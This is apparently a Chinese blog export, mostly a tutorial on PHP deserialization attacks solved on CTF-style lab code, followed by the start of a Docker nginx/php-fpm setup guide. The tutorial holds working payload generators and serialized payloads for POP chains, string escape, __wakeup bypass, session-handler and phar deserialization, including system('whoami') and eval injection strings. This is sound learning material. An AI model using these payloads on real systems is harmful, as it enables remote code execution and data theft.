$password;\n\t}\n\n\tpublic static function __callStatic($arg1,$arg2){\n\t\techo $arg1.\"\\n\";\n\t\tfor($i = 0;$i < count($arg2); ++$i){\n\t\t\techo $arg2[$i].\"\\n\";\n\t\t}\n\t}\n}\n\n$a = new User();\n\n$a::test('a','b','c');\n\n?>\n```\n\n#### get\n\n![image-20250128172324983](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128172324983.png)\n\n```php\n<?php\nerror_reporting(0);\nclass User\n{\n\tpublic $id;\n\tpublic $username;\n\tprivate $password;\n\n\tpublic function __construct($id = null, $username = null, $password = null)\n\t{\n\t\t$this->id = $id;\n\t\t$this->username = $username;\n\t\t$this->password = $password;\n\t}\n\n\tpublic function __get($arg1)\n\t{\n\t\techo $arg1;\n\t}\n}\n\n$a = new User();\n\n$a->var2;\n?>\n```\n\n#### set\n\n![image-20250128173310548](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128173310548.png)\n\n```php\n<?php\nerror_reporting(0);\nclass User\n{\n\tpublic $id;\n\tpublic $username;\n\tprivate $password;\n\n\tpublic function __construct($id = null, $username = null, $password = null)\n\t{\n\t\t$this->id = $id;\n\t\t$this->username = $username;\n\t\t$this->password = $password;\n\t}\n\n\tpublic function __set($arg1,$arg2){\n\t\techo $arg1.$arg2;\n\t}\n}\n\n$a = new User();\n\n$a->var2 = '111';//会输出var2111\n?>\n```\n\n#### isset\n\n![image-20250128173728782](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128173728782.png)\n\n```php\n/*arg1就是不可访问变量的属性名*/\n<?php\nerror_reporting(0);\nclass User\n{\n\tpublic $id;\n\tpublic $username;\n\tprivate $password;\n\n\tpublic function __construct($id = null, $username = null, $password = null)\n\t{\n\t\t$this->id = $id;\n\t\t$this->username = $username;\n\t\t$this->password = $password;\n\t}\n\n\tpublic function __isset($arg1){\n\t\techo $arg1;\n\t}\n}\n\n$a = new User();\nisset($a->password);//私有成员不可访问\nempty($a->password);\n?>\n```\n\n#### unset\n\n![image-20250128174257603](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128174257603.png)\n\n#### clone\n\n![image-20250128174410383](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128174410383.png)\n\n```php\n<?php\nerror_reporting(0);\nclass User\n{\n\tpublic $id;\n\tpublic $username;\n\tprivate $password;\n\n\tpublic function __construct($id = null, $username = null, $password = null)\n\t{\n\t\t$this->id = $id;\n\t\t$this->username = $username;\n\t\t$this->password = $password;\n\t}\n\n\tpublic function __clone(){\n\t\techo 'cloned!';\n\t} \n}\n\n$a = new User();\n$b = clone($a);//输出cloned!\n?>\n```\n\n### 总结表\n\n![image-20250128174640191](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128174640191.png)\n\n![image-20250128174654947](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250128174654947.png)\n\n# pop链\n\n## 前置知识\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass index {\n    private $test;\n    public function __construct(){\n        $this->test = new normal();\n    }\n    public function __destruct(){\n        $this->test->action();\n    }\n}\nclass normal {\n    public function action(){\n        echo \"please attack me\";\n    }\n}\nclass evil {\n    var $test2;\n    public function action(){\n        eval($this->test2);//<-漏洞\n    }\n}\nunserialize($_GET['test']);\n?>\n```\n\n## 反推法\n\n```\n1.先找漏洞在哪，eval()函数处有漏洞\n2.eval调用evil的$test2\n3.但是单单unserialize()并不会调用evil的action()\n4.unserialize()会调用__destruct()\n5.但是__destruct()中的$test是normal的实例\n6.要想办法构造序列化字符串使index中的$test变成evil的实例\n```\n\n构造序列化字符串\n\n方法1:直接改代码加注释，在类里赋值，让php帮忙跑出想要的序列化字符串\n\n```php\n<?php\n// highlight_file(__FILE__);\nerror_reporting(0);\nclass index\n{\n\tprivate $test;\n\tpublic function __construct()\n\t{\n\t\t$this->test = new evil();\n\t}\n\t// public function __destruct()\n\t// {\n\t// \t$this->test->action();\n\t// }\n}\n// class normal\n// {\n// \tpublic function action()\n// \t{\n// \t\techo \"please attack me\";\n// \t}\n// }\nclass evil\n{\n\tvar $test2 = 'echo \"Hello World!\";';\n\t// public function action()\n\t// {\n\t// \teval($this->test2);\n\t// }\n}\n// unserialize($_GET['test']);\necho urlencode(serialize(new index()));\n?>\n```\n\n方法2:在类外进行赋值\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass index\n{\n\tpublic $test;//偷偷改成public，如果是private就只能用第一种方式\n}\nclass evil\n{\n\tvar $test2;\n}\n$a = new evil();\n$a->test2 = 'system(\"ls\")';\n$b = new index();\n$b->test = $a;\necho serialize($b);\n?>\n```\n\n## 魔术方法触发规则\n\n`触发前提：魔术方法所在的类或对象被调用`\n\neg:\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass fast {\n    public $source;\n    public function __wakeup(){\n        echo \"wakeup is here!!\";\n        echo  $this->source;//如果要触发toString(),这里的source就得是sec的对象\n    }\n}\nclass sec {\n    var $benben;\n    public function __tostring(){\n        echo \"tostring is here!!\";\n    }\n}\n$b = $_GET['benben'];\nunserialize($b);\n?>\n```\n\n`目标:显示tostring is here!!`\n\n![image-20250129135501919](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250129135501919.png)\n\n```php\n//生成序列化字符串的url编码\n<?php\nerror_reporting(0);\nclass fast\n{\n\tpublic $source;\n}\nclass sec\n{\n\tvar $benben;\n}\n$a = new fast();\n$b = new sec();\n$a->source = $b;\n\necho urlencode(serialize($a));\n//输出O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D\n?>\n```\n\n`构造url,?benben=O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D`\n\n先执行wakeup()再执行toString()\n\n## POP链构造与POC编写\n\n![image-20250129142111093](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250129142111093.png)\n\neg:\n\n```php\n <?php\n//flag is in flag.php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass Modifier {\n    private $var;\n    public function append($value)\n    {\n        include($value);\n        echo $flag;//1.目的要输出$flag\n    }\n    public function __invoke(){//2.触发__invoke()调用append()并把$var设置成flag.php\n        $this->append($this->var);\n    }\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __toString(){\n        return $this->str->source;//4.如果把$str赋值为Test，Test中没有source成员，就会触发__get()\n    }\n    public function __wakeup(){//6.最终unserialize()触发__wakeup()\n        echo $this->source;//5.触发toString(),把自己作为变量赋值给$source\n    }\n}\n\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();//3.如果把$p变成Modifier,调用__get()就会触发Modifier的__invoke()\n    }\n}\n\nif(isset($_GET['pop'])){\n    unserialize($_GET['pop']);\n}\n?> \n```\n\n`第一步：触发invoke，使$var = 'flag.php'`\n\n`第二步：触发get，给$p赋值为对象Modifier`\n\n`第三步：触发toString，给$str赋值为对象Test`\n\n`第四步：触发wakeup，给source赋值为自己的对象`\n\n因为wakeup在Show中，所以我们构造序列化字符串中传递的参数就是Show\n\n```php\n<?php\n//flag is in flag.php\n// highlight_file(__FILE__);\nerror_reporting(0);\nclass Modifier {\n    private $var = 'flag.php';//私有属性就不能在外赋值了\n}\n\nclass Show{\n    public $source;\n    public $str;\n}\n\nclass Test{\n    public $p;\n}\n\n$a  = new Modifier();\n$b = new Show();\n$c = new Test();\n$b->source = $b;\n$b->str = $c;\n$c->p = $a;\n\necho urlencode(serialize($b));\n?> \n```\n\n`把url编码后的序列化字符串作为参数传入?pop=`\n\n得到flag：`` `ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7}`\n\n![image-20250129150018121](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250129150018121.png)\n\n# 字符串逃逸\n\n利用str_replace()\n\n```php\n/**\n * @param array|string $search 要被替换的\n * @param array|string $replace 要替换的\n * @param array|string $subject 替换的对象\n * @return void\n */\nfunction str_replace(array|string $search, array|string $replace, array|string $subject);\n```\n\n![image-20250129204035314](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250129204035314.png)\n\n反序列化时，属性长度不对，成员数量不对都无法进行序列化，会显示bool(false)\n\n```php+HTML\n<?php\nerror_reporting(0);\nclass Test{\n\tpublic $a;\n\tpublic $b;\n}\n\n$a=new Test();\n// echo serialize($a);\n// $ser_str = 'O:4:\"Test\":2:{s:1:\"a\";N;s:1:\"b\";N;}';\n$ser_str = 'O:4:\"Test\":1:{s:1:\"a\";N;s:1:\"b\";N;}';//成员数量不对\nvar_dump(unserialize($ser_str));\n?>\n<!--bool(false)-->\n\n<?php\nerror_reporting(0);\nclass Test{\n\tpublic $a;\n    public $b;\n}\n\n$a=new Test();\n// echo serialize($a);\n// $ser_str = 'O:4:\"Test\":2:{s:1:\"a\";N;s:1:\"b\";N;}';\n$ser_str = 'O:4:\"Test\":2:{s:1111:\"a\";N;s:1:\"b\";N;}';//长度不对\nvar_dump(unserialize($ser_str));\n?>\n<!--bool(false)-->\n```\n\n如果反序列化时，忽略了某个存在的变量，序列化字符串中加上新的变量，最终反序列化结果会包含被忽略的变量和序列化字符串中的变量\n\n```php+HTML\n<?php\nerror_reporting(0);\nclass Test{\n\tpublic $a;\n\tpublic $b;\n}\n\n$a=new Test();\n// echo serialize($a);\n// $ser_str = 'O:4:\"Test\":2:{s:1:\"a\";N;s:1:\"b\";N;}';\n$ser_str = 'O:4:\"Test\":2:{s:1:\"a\";N;s:1:\"c\";N;}';\nvar_dump(unserialize($ser_str));\n?>\n<!--\nobject(Test)#2 (3) {\n  [\"a\"]=>\n  NULL\n  [\"b\"]=>\n  NULL\n  [\"c\"]=>\n  NULL\n}\n>\n```\n\n`为什么长度一定不能错?`\n\n![image-20250129210458056](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250129210458056.png)\n\n```php\n/*反序列化结束符为;}*/\n<?php\nerror_reporting(0);\nclass Test\n{\n\tpublic $a;\n\tpublic $b;\n\tpublic $c = 'c';\n}\n\n$a = new Test();\n$ser_str = 'O:4:\"Test\":2:{s:1:\"a\";N;s:1:\"b\";N;}s:1:\"c\";\"ccc\";}';\nvar_dump(unserialize($ser_str));\n/*\nobject(Test)#2 (3) {\n  [\"a\"]=>\n  NULL\n  [\"b\"]=>\n  NULL\n  [\"c\"]=>\n  string(1) \"c\"\n}\n*/\n?>\n```\n\n## 减少\n\n![image-20250129211715285](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250129211715285.png)\n\n```php\n<?php\nclass Test{\n\tpublic $a;\n\tpublic $b = 'abcsystem';\n\tpublic $c;\n}\n$str = serialize(new Test());\n/*$str = 'O:4:\"Test\":3:{s:1:\"a\";N;s:1:\"b\";s:9:\"abcsystem\";s:1:\"c\";N;}'*/\n$str = str_replace('system',\"\",$str);\n/*$str = 'O:4:\"Test\":3:{s:1:\"a\";N;s:1:\"b\";s:9:*/\"abc\";s:1:\"\"/*\"c\";N;}'*/ //没注释的地方是会被当成$b的值的地方\nvar_dump(unserialize($str));\n?>\n```\n\n![image-20250129213100025](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250129213100025.png)\n\n![image-20250129213948632](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250129213948632.png)\n\n就是构造成员变量的值，在str_replace()的时候，能刚好吃掉不想要的，能够构造我们的命令\n\n`先把我们要执行的命令写好，这样便于构造长度`\n\n```php\n//eg\n<?php\nclass Test{\n\tpublic $a = 'abcsystem';\n\tpublic $b = '构造的表达式';\n}\n$str = serialize(new Test());\necho \"$str\\n\";\n'O:4:\"Test\":2:{s:1:\"a\";s:9:\"abcsystem\";s:1:\"b\";s:?:\"构造的表达式\";}';//要吃到构造的表达式所处的第一个\"\n?>\n/*19个字符要3个system*/\n<?php\nclass Test\n{\n\tpublic $a = 'abcsystemsystemsystem';\n\tpublic $b = '12\";s:1:\"b\";s:20:\"echo \"hello world!\";\";}';//用;}直接截断\n}\n$str = serialize(new Test());\necho \"$str\\n\";\n'O:4:\"Test\":2:{s:1:\"a\";s:21:\"abcsystemsystemsystem\";s:1:\"b\";s:37:\"s:1:\"b\";s:20:\"echo \"hello world!\";\";}\";}';\n//截到构造的表达式前只有19个字符，还要再在构造的表达式前补上2个字符(21 - 19 = 2)和\";\n$str = str_replace('system','',$str);\n$str = 'O:4:\"Test\":2:{s:1:\"a\";s:21:\"abc\";s:1:\"b\";s:37:\"12\";s:1:\"b\";s:20:\"echo \"hello world!\";\";}\";}';\nvar_dump(unserialize($str));\n?>  \n/*\nobject(Test)#1 (2) {\n  [\"a\"]=>\n  string(21) \"abc\";s:1:\"b\";s:37:\"12\"\n  [\"b\"]=>\n  string(20) \"echo \"hello world!\";\"\n}\n*/\n```\n\n### 例题\n\n```php\n<?php\nerror_reporting(0);\nfunction filter($name)\n{\n\t$safe = array(\"flag\", \"php\");\n\t$name = str_replace($safe, \"hk\", $name);\n\treturn $name;\n}\nclass test\n{\n\tvar $user;\n\tvar $pass;\n\tvar $vip = false;\n\tfunction __construct($user, $pass)\n\t{\n\t\t$this->user = $user;\n\t\t$this->pass = $pass;\n\t}\n}\n$param = $_GET['user'];\n$pass = $_GET['pass'];\n$param = serialize(new test($param, $pass));\n$profile = unserialize(filter($param));\n\nif ($profile->vip) {\n\techo file_get_contents(\"flag.php\");\n}\n?>\n\n```\n\n`思路,三个属性,构造第一个属性,使它能吃掉剩下属性的值,在第二个属性中构造表达式使vip=true`\n\n```php\n<?php\nclass test\n{\n\tvar $user = \"php\";\n\tvar $pass = \"\";\n\tvar $vip;\n}\necho serialize(new test());\n?>\n//O:4:\"test\":3:{s:4:\"user\";s:3:\"php\";s:4:\"pass\";s:0:\"\";s:3:\"vip\";N;}\n/*从user值吃到pass值的前一个\",需要18个字符(除去最开始的php),php经过filter变成hk减少一个字符,一共需要18个php才能正确吃完\n让$user = 18个php\n让$pass = \";s:4:\"pass\";N;s:3:\"vip\";b:1;}\n构造url,得到flag\n*/\n\n```\n\n![image-20250130170035120](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250130170035120.png)\n\n## 增多\n\n![image-20250130142716490](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250130142716490.png)\n\n用str_replace(),替换成一个更长的字符串，把多余的字符吐出来\n\n```php\n<?php\nclass Test{\n\tpublic $a = 'a';\n\tpublic $b = 'b';\n}\n$a = new Test();\n$str = serialize($a);\n//'O:4:\"Test\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}';\n$str = str_replace('a','aaa',$str);\n// echo \"$str\\n\";\n/*'O:4:\"Test\":2:{s:1:\"a*/aa/*\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}';*/ //多出来的aa就是吐出的多余代码\n?>\n```\n\n`思路：把吐出来的多余代码构造成功能性代码`\n\n`构造的字符串:\";s:1:\"b\":s:?:\"\";}   用;}结束反序列化，不用管原功能性代码`\n\n`构造的字符串长度为x，将ls替换成pwd会吐一个字符出来，需要x个pwd，这样就能吐x个字符出来，与前面长度正确对应，功能性代码被正确吐出`\n\n![image-20250130144649492](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250130144649492.png)\n\n```php\nclass Test{\n\tpublic $a = 'ls';\n\tpublic $b = 'b';\n}\n$a = new Test();\necho serialize($a).\"\\n\";\n?>\n/*\n想构造一个显示hello world,构造字符串\";s:1:\"b\";s:20:\"echo \"hello world!\";\";} 长度为39\n将ls用pwd替换,吐出一个字符,所以我们需要39个ls,替换后才能吐出39个字符,让功能性代码正确吐出\n*/\n\n<?php\nclass Test{\n\tpublic $a = 'lslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslsls';//39个ls\n\tpublic $b = 'b';\n}\n$a = new Test();\n$hacker = '\";s:1:\"b\";s:20:\"echo \"hello world!\";\";}';\n$a->a = $a->a.$hacker;\n$str = serialize($a);\necho \"$str\\n\";\n$str = str_replace('ls','pwd',$str);\necho \"$str\\n\";\n// 'O:4:\"Test\":2:{s:1:\"a\";s:114:\"pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd\";s:1:\"b\";s:20:\"echo \"hello world!\";\";\";s:1:\"b\";s:1:\"b\";}';\nvar_dump(unserialize($str));\n?>\n```\n\n### 例题\n\n```php\n<?php\n// highlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($name)\n{\n\t$safe = array(\"flag\", \"php\");\n\t$name = str_replace($safe, \"hack\", $name);\n\treturn $name;\n}\nclass test\n{\n\tvar $user;\n\tvar $pass = 'daydream';\n\tfunction __construct($user)\n\t{\n\t\t$this->user = $user;\n\t}\n}\n$param = $_GET['param'];\n$param = serialize(new test($param));\n$profile = unserialize(filter($param));\n\nif ($profile->pass == 'escaping') {\n\techo file_get_contents(\"flag.php\");\n}\n?>\n```\n\n`目标:判断pass是否为escaping;用filter将php换成hack达到字符串增多`\n\n`目标逃逸代码:\";s:4:\"pass\";s:8:\"escaping\";},29个字符,所以需要29个php`\n\n`构造参数?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp%22%3Bs%3A4%3A%22pass%22%3Bs%3A8%3A%22escaping%22%3B%7D`\n\n得到flag\n\n![image-20250130161400401](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250130161400401.png)\n\n \n\n# wakeup魔术方法绕过\n\n![image-20250130195342613](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250130195342613.png)\n\n## 例题\n\n```php\n <?php\nerror_reporting(0);\nclass secret{\n    var $file='index.php';\n\n    public function __construct($file){\n        $this->file=$file;\n    }\n\n    function __destruct(){\n        include_once($this->file);\n        echo $flag;\n    }\n\n    function __wakeup(){\n        $this->file='index.php';\n    }\n}\n$cmd=$_GET['cmd'];\nif (!isset($cmd)){\n    highlight_file(__FILE__);\n}\nelse{\n    if (preg_match('/[oc]:\\d+:/i',$cmd)){\n        echo \"Are you daydreaming?\";\n    }\n    else{\n        unserialize($cmd);\n    }\n}\n//sercet in flag.php\n?>\n```\n\n`分析:要绕过__wakeup(),O:后面不能跟数字以绕过正则表达式`\n\n```php\n<?php\nclass secret\n{\n\tvar $file = 'flag.php';\n}\necho serialize(new secret()).\"\\n\";//获取原序列化字符串\necho urlencode('O:+6:\"secret\":2:{s:4:\"file\";s:8:\"flag.php\";}');//在数字前加上+绕过正则表达式,把属性数改大绕过wakeup\n?>\n```\n\n`拿到flag`\n\n![image-20250130201142193](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250130201142193.png)\n\n# 引用\n\nphp中引用为 `&`\n\n```php\n<?php\nclass Test{\n\tpublic $a;\n\tpublic $b;\n}\n$test = new Test();\n$test->a = &$test->b; // a是b的引用\necho serialize($test).\"\\n\";/*O:4:\"Test\":2:{s:1:\"a\";N;s:1:\"b\";R:2;}*/\n?>\n```\n\n\n\n## 例题\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\nclass just4fun {\n    var $enter;\n    var $secret;\n}\n\nif (isset($_GET['pass'])) {\n    $pass = $_GET['pass'];\n    $pass=str_replace('*','\\*',$pass);\n}\n\n$o = unserialize($pass);\n\nif ($o) {\n    $o->secret = \"*\";\n    if ($o->secret === $o->enter)\n        echo \"Congratulation! Here is my secret: \".$flag;\n    else\n        echo \"Oh no... You can't fool me\";\n}\nelse echo \"are you trolling?\";\n?>\n```\n\n![image-20250130201920662](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250130201920662.png)\n\n这题中传入引用即可\n\n```php\n<?php\n// highlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\nclass just4fun {\n    var $enter;\n    var $secret;\n}\n\n$a = new just4fun();\n$a->enter = &$a->secret;\necho serialize($a);\n?>\n```\n\n![image-20250130203657364](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250130203657364.png)\n\n# session反序列化漏洞\n\n一个页面写入session，一个页面读出session\n\n![image-20250131192743028](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250131192743028.png)\n\n![image-20250131192927457](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250131192927457.png)\n\n![image-20250131193335888](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250131193335888.png)\n\n![image-20250131193700202](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250131193700202.png)\n\n![image-20250131193923676](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250131193923676.png)\n\n## 例题\n\nno.1\n\n```php\n//写入session\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nini_set('session.serialize_handler','php_serialize');\nsession_start();\n$_SESSION['ben'] = $_GET['a'];\n?> \n```\n\n```php\n//读出session\n<?php \nhighlight_file(__FILE__);\nerror_reporting(0);\n\nini_set('session.serialize_handler','php');\nsession_start();\n\nclass D{\n    var $a;\n    function __destruct(){\n        eval($this->a);//漏洞所在\n    }\n}\n?> \n```\n\n`以php_serialize方式写入,以php方式读出,php方式键名|序列化字符串,所以构造参数时要加|`\n\n构造参数 `?a=|O:1:\"D\":1:{s:1:\"a\";s:20:\"echo \"hello world!\";\";}`\n\nno.2\n\n```php\n//写入session\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n$_SESSION['a'] = $_GET['a'];\n?> \n```\n\n```php\n//读出session\n<?php\nhighlight_file(__FILE__);\n/*hint.php*/\nsession_start();\nclass Flag{\n    public $name;\n    public $her;\n    function __wakeup(){\n        $this->her=md5(rand(1, 10000));\n        if ($this->name===$this->her){\n            include('flag.php');\n            echo $flag;\n        }\n    }\n}\n?> \n```\n\n`分析:需要用到引用,以php_serialize方式写入session,php方式读出`\n\n构造参数`?a=|O:4:\"Flag\":2:{s:4:\"name\";N;s:3:\"her\";R:2;}`;\n\n# phar反序列化漏洞\n\n![image-20250131202912176](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250131202912176.png)\n\n![image-20250131203108136](C:\\Users\\27251\\Desktop\\笔记\\服务外包\\img_phpser\\image-20250131203108136.png)\n\n`重点关注manifest这个字段`\n\nmanifest字段格式\n\n![image-20250131203407383](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250131203407383.png)\n\n24byte后是序列化的字符串\n\n## 漏洞原理\n\n![image-20250131205146089](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250131205146089.png)\n\n## 例题\n\nno.1\n\n```php\n <?php\nhighlight_file(__FILE__);\nclass Testobj\n{\n    var $output='';\n}\n\n@unlink('test.phar');   //删除之前的test.par文件(如果有)\n$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀\n$phar->startBuffering();  //开始写文件\n$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub\n$o=new Testobj();\n$o->output='eval($_GET[\"a\"]);';\n$phar->setMetadata($o);//写入meta-data\n$phar->addFromString(\"test.txt\",\"test\");  //添加要压缩的文件\n$phar->stopBuffering();\n?>\n\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass Testobj\n{\n    var $output=\"echo 'ok';\";\n    function __destruct()\n    {\n        eval($this->output);\n    }\n}\nif(isset($_GET['filename']))\n{\n    $filename=$_GET['filename'];\n    var_dump(file_exists($filename));\n}\n?> \n```\n\n`分析:phar中manifest的值是对Testobj中$output=eval($_GET['a'])进行序列化后得到的字符串,反序列化必然会调用__destruct(),相当于eval(eval($_GET['a'])),执行了eval($_GET['a']),所以要传入两个参数,$filename处就可以传入phar伪协议参数,??filename=phar://test.phar&a=system('whoami');`","tags":["Web安全","反序列化"],"categories":["Web安全","PHP反序列化"]},{"title":"使用Docker搭建Nginx以及PHP-fpm","url":"/2025/01/17/docker搭建nginx+php-fpm/","content":"\n# 前言\n\n想自己搭建靶场所以学习docker+nginx+php，但是这两天一直卡在配环境上，踩了许多的坑最终才完成环境的配置\n\n参考了[docker部署php和nginx环境_docker nginx php-CSDN博客](https://blog.csdn.net/weixin_44471703/article/details/125250625?spm=1001.2014.3001.5502)\n\n编辑文件如果不喜欢用vim，可以用vscode远程连接然后打开文件夹进行文件编辑等操作\n\n参考：[vscode连接远程服务器（傻瓜式教学）-CSDN博客](https://blog.csdn.net/web22050702/article/details/135681427?ops_request_misc=%7B%22request%5Fid%22%3A%22b977d11eeed65887fea329d5ce4ea4b1%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=b977d11eeed65887fea329d5ce4ea4b1&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-135681427-null-null.142^v101^control&utm_term=vscode远程连接&spm=1018.2226.3001.4187)\n\nOS：centOS 7.9 64位\n\n\n\n# 要点\n\n1. 最好是自己创建一个网络，把php容器和nginx容器都加入该网络中（做了这步就很神奇的可以解析php了）\n2. 自己创建目录结构尽量明了\n3. nginx容器的根目录路径和php容器的根目录路径要挂载到同一目录\n4. php.ini需要自己创建\n5. 挂载后根目录中要有index.html等默认页面，不然会报403（刚遇到让人一头雾水）\n6. nginx的default.conf和nginx.conf一定要配置正确\n7. 有问题多看日志，多拿错误日志信息问问ai（\n\n# 过程\n\n## 创建自己的网络\n\n```bash\ndocker network create mynet\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n 后续php容器，nginx容器加入该网络\n\n## 创建辅助容器\n\n创建php和nginx两个容器，用于复制配置文件(仅仅用于辅助，我就没进行端口映射)\n\n```bash\ndocker run -d --name nginx nginx\ndocker run -d --name php php:7.3-fpm\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n> 1.参数说明：-d 后台运行 --name 给容器取个名字\n\n- ##       路径设置\n\n> 使用docker cp命令：\n>\n> 将容器中路径的内容复制到docker host路径中\n>\n> docker cp 容器名:路径 目的路径\n>\n> \n>\n> nginx的配置文件位于/etc/nginx\n>\n> nginx的日志文件位于/var/log\n>\n> php配置文件位于/usr/local/etc/php\n\n![img](https://i-blog.csdnimg.cn/direct/af258145269c48f797f6a7e06b1c0300.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n> 将nginx和php的配置文件复制到主机的/data下，nginx的日志文件复制到/data/nginx\n\n```bash\nmkdir /data\ncd /data\n\n#nginx\ndocker cp nginx:/etc/nginx ./\ndocker cp nginx:/var/log ./nginx\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n>  用tree /data看一下目录层级有没有正确\n>\n> 如果没有安装tree\n>\n> yum install tree\n\n![img](https://i-blog.csdnimg.cn/direct/d144efa689f844d588076fcfe962c43b.png)\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n复制php配置文件\n\n![img](https://i-blog.csdnimg.cn/direct/cd56c8bb67c146bfa304eed38c4be344.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n> 进入php容器，可以用:\n>\n> php -i | grep php.ini\n>\n> 得到配置文件路径\n>\n> /usr/local/etc/php\n\n```bash\n#php (工作路径处于/data下)\ndocker cp php:/usr/local/etc/php ./\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n做完以上操作后，目录层级结构如下：\n\n![img](https://i-blog.csdnimg.cn/direct/257fd9fb1a6543999e1910a9c2bfec30.png)\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n做完这些，我们需要将php.ini-development或者php.ini-production中的其中一个改成php.ini\n\n```bash\n#工作路径/data\nmv ./php/php.ini-development ./php/php.ini\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n 修改后如下\n\n![img](https://i-blog.csdnimg.cn/direct/4f48e6e5cea1464d88e4952a968a1a9b.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n然后我们需要有一个工作目录用来挂载初始页面目录,并且放一个index.html进去（不然到时候会403）\n\n```bash\nmkdir ./www\ntouch ./www/index.html\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n 目录层级如下\n\n 